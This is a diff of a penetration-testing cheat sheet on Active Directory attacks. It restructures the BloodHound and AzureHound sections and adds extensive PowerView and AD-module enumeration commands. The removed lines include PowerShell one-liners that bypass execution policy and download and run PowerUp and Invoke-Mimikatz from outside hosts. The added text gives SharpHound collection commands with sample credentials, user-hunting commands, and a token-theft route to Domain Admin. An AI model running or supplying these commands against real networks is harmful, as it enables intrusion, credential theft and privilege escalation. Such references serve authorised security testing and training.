@@ -5,6 +5,10 @@
 - [Active Directory Attacks](#active-directory-attacks)
   - [Summary](#summary)
   - [Tools](#tools)
+  - [Active Directory Recon](#active-directory-recon)
+    - [Using BloodHound](#using-bloodhound)
+    - [Using PowerView](#using-powerview)
+    - [Using AD Module](#using-ad-module)
   - [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
     - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
     - [CVE-2020-1472 ZeroLogon](#cve-2020-1472-zerologon)
@@ -79,34 +83,6 @@
 * [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
 * [Mimikatz](https://github.com/gentilkiwi/mimikatz)
 * [Ranger](https://github.com/funkandwagnalls/ranger)
-* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
-
-  ```powershell
-  # start BloodHound and the database
-  root@payload$ apt install bloodhound #kali
-  root@payload$ neo4j console
-  root@payload$ ./bloodhound
-  Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
-  
-  # run the ingestor on the machine using SharpHound.exe
-  # https://github.com/BloodHoundAD/SharpHound3
-  .\SharpHound.exe (from resources/Ingestor)
-  .\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
-  .\SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
-  .\SharpHound.exe -c all -d active.htb -SearchForest
-  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
-  .\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
-
-  # or run the ingestor on the machine using Powershell
-  # https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors
-  Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
-  Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
-
-  # or remotely via BloodHound Python
-  # https://github.com/fox-it/BloodHound.py
-  bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
-  ```
-
 * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 
@@ -139,24 +115,6 @@
   # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
   # -i: open an interactive shell
   ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
-  ```
-
-* [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)
-
-  ```powershell
-  # require: Install-Module -name Az -AllowClobber
-  # require: Install-Module -name AzureADPreview -AllowClobber
-  Connect-AzureAD
-  Connect-AzAccount
-  . .\AzureHound.ps1
-  Invoke-AzureHound
-  ```
-
-* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
-
-  ```powershell
-  powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
-  powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
   ```
 
 * [ADRecon](https://github.com/sense-of-security/ADRecon)
@@ -203,6 +161,236 @@
     Install-Lab
     Show-LabDeploymentSummary
     ```
+
+## Active Directory Recon
+
+### Using BloodHound
+
+Use the correct collector
+* AzureHound for Azure Active Directory
+* SharpHound for local Active Directory
+
+use [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)
+
+```powershell
+# require: Install-Module -name Az -AllowClobber
+# require: Install-Module -name AzureADPreview -AllowClobber
+Connect-AzureAD
+Connect-AzAccount
+. .\AzureHound.ps1
+Invoke-AzureHound
+```
+
+use [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+
+```powershell
+# run the collector on the machine using SharpHound.exe
+# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
+.\SharpHound.exe (from resources/Ingestor)
+.\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
+.\SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
+.\SharpHound.exe -c all -d active.htb -SearchForest
+.\SharpHound.exe --EncryptZip --ZipFilename export.zip
+.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
+
+# or run the collector on the machine using Powershell
+# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
+Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
+Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
+
+# or remotely via BloodHound Python
+# https://github.com/fox-it/BloodHound.py
+pip install bloodhound
+bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
+```
+
+Then import the zip/json files into the Neo4J database and query them.
+
+```powershell
+root@payload$ apt install bloodhound 
+
+# start BloodHound and the database
+root@payload$ neo4j console
+root@payload$ ./bloodhound --no-sandbox
+Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
+```
+
+You can add some custom queries like [Bloodhound-Custom-Queries](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json) from @hausec. Replace the customqueries.json file located at `/home/username/.config/bloodhound/customqueries.json` or `C:\Users\USERNAME\AppData\Roaming\BloodHound\customqueries.json`.
+
+
+### Using PowerView
+  
+- **Get Current Domain:** `Get-NetDomain`
+- **Enum Other Domains:** `Get-NetDomain -Domain <DomainName>`
+- **Get Domain SID:** `Get-DomainSID`
+- **Get Domain Policy:** 
+  ```
+  Get-DomainPolicy
+
+  #Will show us the policy configurations of the Domain about system access or kerberos
+  (Get-DomainPolicy)."system access"
+  (Get-DomainPolicy)."kerberos policy"
+  ```
+- **Get Domain Controlers:** 
+  ```
+  Get-NetDomainController
+  Get-NetDomainController -Domain <DomainName>
+  ```
+- **Enumerate Domain Users:** 
+  ```
+  Get-NetUser
+  Get-NetUser -SamAccountName <user> 
+  Get-NetUser | select cn
+  Get-UserProperty
+
+  #Check last password change
+  Get-UserProperty -Properties pwdlastset
+
+  #Get a spesific "string" on a user's attribute
+  Find-UserField -SearchField Description -SearchTerm "wtver"
+  
+  #Enumerate user logged on a machine
+  Get-NetLoggedon -ComputerName <ComputerName>
+  
+  #Enumerate Session Information for a machine
+  Get-NetSession -ComputerName <ComputerName>
+  
+  #Enumerate domain machines of the current/specified domain where specific users are logged into
+  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
+  ```
+- **Enum Domain Computers:** 
+  ```
+  Get-NetComputer -FullData
+  Get-DomainGroup
+
+  #Enumerate Live machines 
+  Get-NetComputer -Ping
+  ```
+- **Enum Groups and Group Members:**
+  ```
+  Get-NetGroupMember -GroupName "<GroupName>" -Domain <DomainName>
+  
+  #Enumerate the members of a specified group of the domain
+  Get-DomainGroup -Identity <GroupName> | Select-Object -ExpandProperty Member
+  
+  #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
+  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
+  ```
+- **Enumerate Shares**
+  ```
+  #Enumerate Domain Shares
+  Find-DomainShare
+  
+  #Enumerate Domain Shares the current user has access
+  Find-DomainShare -CheckShareAccess
+  ```
+- **Enum Group Policies:** 
+  ```
+  Get-NetGPO
+
+  # Shows active Policy on specified machine
+  Get-NetGPO -ComputerName <Name of the PC>
+  Get-NetGPOGroup
+
+  #Get users that are part of a Machine's local Admin group
+  Find-GPOComputerAdmin -ComputerName <ComputerName>
+  ```
+- **Enum OUs:** 
+  ```
+  Get-NetOU -FullData 
+  Get-NetGPO -GPOname <The GUID of the GPO>
+  ```
+- **Enum ACLs:** 
+  ```
+  # Returns the ACLs associated with the specified account
+  Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
+  Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose
+
+  #Search for interesting ACEs
+  Invoke-ACLScanner -ResolveGUIDs
+
+  #Check the ACLs associated with a specified path (e.g smb share)
+  Get-PathAcl -Path "\\Path\Of\A\Share"
+  ```
+- **Enum Domain Trust:** 
+  ```
+  Get-NetDomainTrust
+  Get-NetDomainTrust -Domain <DomainName>
+  ```
+- **Enum Forest Trust:** 
+  ```
+  Get-NetForestDomain
+  Get-NetForestDomain Forest <ForestName>
+
+  #Domains of Forest Enumeration
+  Get-NetForestDomain
+  Get-NetForestDomain Forest <ForestName>
+
+  #Map the Trust of the Forest
+  Get-NetForestTrust
+  Get-NetDomainTrust -Forest <ForestName>
+  ```
+- **User Hunting:** 
+  ```
+  #Finds all machines on the current domain where the current user has local admin access
+  Find-LocalAdminAccess -Verbose
+
+  #Find local admins on all machines of the domain:
+  Invoke-EnumerateLocalAdmin -Verbose
+
+  #Find computers were a Domain Admin OR a spesified user has a session
+  Invoke-UserHunter
+  Invoke-UserHunter -GroupName "RDPUsers"
+  Invoke-UserHunter -Stealth
+
+  #Confirming admin access:
+  Invoke-UserHunter -CheckAccess
+  ```
+  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
+  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him ->   
+  Profit!
+
+  [PowerView 3.0 Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
+### Using AD Module
+
+- **Get Current Domain:** `Get-ADDomain`
+- **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
+- **Get Domain SID:** `Get-DomainSID`
+- **Get Domain Controlers:** 
+  ```
+  Get-ADDomainController
+  Get-ADDomainController -Identity <DomainName>
+  ```
+- **Enumerate Domain Users:** 
+  ```
+  Get-ADUser -Filter * -Identity <user> -Properties *
+
+  #Get a spesific "string" on a user's attribute
+  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
+  ```
+- **Enum Domain Computers:** 
+  ```
+  Get-ADComputer -Filter * -Properties *
+  Get-ADGroup -Filter * 
+  ```
+- **Enum Domain Trust:** 
+  ```
+  Get-ADTrust -Filter *
+  Get-ADTrust -Identity <DomainName>
+  ```
+- **Enum Forest Trust:** 
+  ```
+  Get-ADForest
+  Get-ADForest -Identity <ForestName>
+
+  #Domains of Forest Enumeration
+  (Get-ADForest).Domains
+  ```
+ - **Enum Local AppLocker Effective Policy:**
+ ```
+ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+ ```
 
 ## Most common paths to AD compromise
 
